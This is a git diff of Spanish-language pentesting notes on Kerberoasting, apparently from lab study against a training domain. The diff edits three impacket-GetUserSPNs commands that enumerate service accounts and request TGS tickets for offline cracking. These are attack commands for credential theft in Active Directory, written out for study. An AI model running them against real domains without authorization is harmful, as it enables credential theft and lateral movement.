@@ -4,15 +4,15 @@ Técnica de escalada de privilegios y movimiento lateral. Se atacan cuentas asoc
 Necesitamos tener credenciales de acceso (texto plano o NTML hash) y una shell en el contexto del usuario de dominio o `SYSTEM` shell. En los ejemplos suponemos que tenemos acceso al dominio con el usuario `forend`
 - Listar cuentas SPN - GetUserSPNs.py 
 	```bash
-	impacket-GetUserSPNs -dc-ip $dcip INLANEFREIGHT.LOCAL/forend
+	impacket-GetUserSPNs -dc-ip $dcip $domain/$username -outputfile hash_kerberoast
 	```
 - Solicitar todos los tickets TGS (añadir la flag `-requets` al comando anterior)
 	```bash
-	GetUserSPNs.py -dc-ip $dcip INLANEFREIGHT.LOCAL/forend -request -outputfile allTickets
+	impacket-GetUserSPNs -dc-ip $dcip $domain/$username -request -outputfile allTickets
 	```
 - Solicitar el ticket de un solo servicio (ej: `sqldev`)
 	```bash
-	GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+	impacket-GetUserSPNs -dc-ip 172.16.5.5 $domain/$username -request-user sqldev
 	```
 
 ### Windows 
